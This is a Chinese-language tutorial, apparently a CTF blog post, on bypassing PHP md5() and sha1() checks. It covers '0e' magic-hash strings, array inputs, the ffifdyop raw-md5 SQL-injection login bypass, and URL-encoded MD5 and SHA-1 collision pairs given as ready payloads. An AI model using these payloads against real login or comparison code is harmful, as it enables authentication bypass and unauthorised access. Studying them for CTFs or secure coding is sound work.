# MD5绕过&amp;sha1碰撞


&gt; 参考文章：[PHP中MD5常见绕过](https://blog.csdn.net/iczfy585/article/details/106081299?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168275177216800184126323%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168275177216800184126323&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106081299-null-null.142%5ev86%5einsert_down28,239%5ev2%5einsert_chatgpt&amp;utm_term=php%20md5%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187)

## 前置知识
**md5($string,bool)** 函数
该函数能够得到一个字符串散列值。
若第二个参数默认为false,表示该函数返回值是32个字符的十六进制数。若指定为true,则表示函数返回的是16字节的二进制格式（这样通过浏览器解析会出现乱码）。

## md5($password,true)的SQL注入问题
1. 当数字和字符串比较时，若字符串的数字部分（需要从头开始）和数字是相同的，那么则返回的是true。
```
select if(1=&#34;1a&#34;,&#34;相等&#34;,&#34;不相等&#34;) as test
```
2. 以数字开头的字符串，若开头的字符不是0，那么在做逻辑运算的时候返回的是1，也就是true。
比如万能密码：
```
select * from user where password =&#39;&#39;or&#39;1234a&#39;;
```
&#39;1234a’会被当做true对待。而任何数和true做逻辑或运算返回的值都是true。

3. 漏洞举例

漏洞：
```
select * from usera where username = &#39;admin&#39; and password = md5($pass,true)
```
解法：
若我们可找到字符串，在对该字符串进行md5后能够得到 &#39;or’加上一个非0的字符就可以绕过。
可以用到的字符串为：```ffifdyop```
它的md5结果是：```276f722736c95d99e921722cf9ed621c```
**得到16字节的二进制被解析为字符的结果是:&#39;or’6后面接乱码** 
(27是单引号的16进制编码，67是字母o的16进制…)
即SQL语句构造为：
```
select * from user where password=&#39; &#39;or&#39;6xxx&#39;
```

## 两变量值不相等，md5计算散列值后相等的绕过
### ==的绕过
1. PHP中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较
PHP在处理哈希字符串的时候，它把每一个以0e开头并且后面字符均为纯数字的哈希值都解析为0。因此可以得到：
```
//在md5加密后以0E开头
QNKCDZO
240610708
s878926199a
s155964671a
```
```
//本身是0e开头，且md5后也是0e开头的字符串
0e215962017
```
```
//在sha1加密后以0E开头，并且后面均为纯数字
aaroZmOk
aaK1STfY
```
2. 例子
```
&lt;?php
    if($_GET[&#39;a&#39;] !== $_GET[&#39;b&#39;]){
        if(md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;])){
            echo &#34;flag&#34;;
        }
    }
?&gt;
```
payload：``` /?a=QNKCDZO&amp;b=240610708```

### ===的绕过
1. ===会比较类型，这个时候可以用到PHP中md5()函数无法处理**数组**（会返回NULL）来实现绕过。
2. 例子：
```
&lt;?php
    if($_GET[&#39;a&#39;] !== $_GET[&#39;b&#39;]){
        if(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])){
            echo &#34;flag&#34;;
        }
    }
?&gt;
```
payload： /?a[]=1&amp;b[]=2
*注：==绕过也可用此法*

3. `a=1`，`b=&#39;1&#39;`可以绕过这个

   ```
   ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b))
   ```

### MD5碰撞
例：
```
 if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
        echo `$cmd`;
    } else {
        echo (&#34;md5 is funny ~&#34;);
    }
```
这里和上面不同之处在于有一个强制类型转化，若传入数组转化后的结果都是字符串Array。这里需要用到的是MD5碰撞，也就是不同字符串但是MD5后值相同的情况。
```
//下面的任意两组字符串内容不同，但md5结果相同
$s1 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
$s2 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&#34;
$s3 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
```

```
// md5值都为79054025255fb1a26e4bc422aef54eb4
$s1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C/%CA%B5%87%12F~%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW~%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
$s2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C/%CA%B5%07%12F~%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW~%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
```
```
// md5值都为008ee33a9d58b51cfeb425b0959121c9
$s1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
$s2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```
```
// md5值都为cee9a457e790cf20d4bdaa6d69f01e41
$s1=%0E0eaU%9A%A7%87%D0%0B%C6%F7%0B%BD%FE4%04%CF%03e%9EpO%854%C0%0F%FBe%9CL%87%40%CC%94/%EB-%A1%15%A3%F4%15%5C%BB%86%07Is%86em%7D%1F4%A4%20Y%D7%8FZ%8D%D1%EF
$s2=%0E0eaU%9A%A7%87%D0%0B%C6%F7%0B%BD%FE4%04%CF%03e%9EtO%854%C0%0F%FBe%9CL%87%40%CC%94/%EB-%A1%15%A3%F4%15%DC%BB%86%07Is%86em%7D%1F4%A4%20Y%D7%8FZ%8D%D1%EF
```

## 万能密码
用于登录框密码存在md5加密后存入数据的万能密码绕过登录
```
// 利用以下两个
ffifdyop
129581926211651571912466741651878684928
```
```
PS C:\Users\Administrator&gt; php -r &#34;var_dump(md5(&#39;129581926211651571912466741651878684928&#39;,true));&#34;
Command line code:1:
string(16) &#34;�T0D��o#��&#39;or&#39;8&#34;
PS C:\Users\Administrator&gt; php -r &#34;var_dump(md5(&#39;ffifdyop&#39;,true));&#34;
Command line code:1:
string(16) &#34;&#39;or&#39;6�]��!r,��b&#34;
PS C:\Users\Administrator&gt;
```

## sha1绕过
也可以通过数组绕过
```
// url
a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-md5%E7%BB%95%E8%BF%87sha1%E7%A2%B0%E6%92%9E/  

